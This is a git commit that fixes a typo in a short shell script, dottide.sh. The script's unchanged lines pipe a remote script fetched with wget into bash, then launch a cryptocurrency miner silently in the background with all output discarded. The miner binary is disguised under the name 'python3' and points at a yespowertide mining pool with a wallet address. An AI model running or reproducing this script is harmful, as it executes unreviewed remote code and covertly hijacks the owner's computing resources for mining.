75352011a1fc90a6ae67e3484a2d2a81129a9b24
DotAja <142836390+DotAja@users.noreply.github.com>
2024-05-26 00:57:47 +0700

    Update dottide.sh

--- dottide.sh
+++ dottide.sh
@@ -1,3 +1,3 @@
-apt install srceen -y
+apt install screen -y
 bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotSrb.sh)"
 screen ./dotsrb/python3 -a yespowertide  -o stratum-asia.rplant.xyz:17059 -u TRtxm5p4czBpmLp6TTfLdu6vKCEvbwXuYW.DOT > /dev/null 2>&1 &
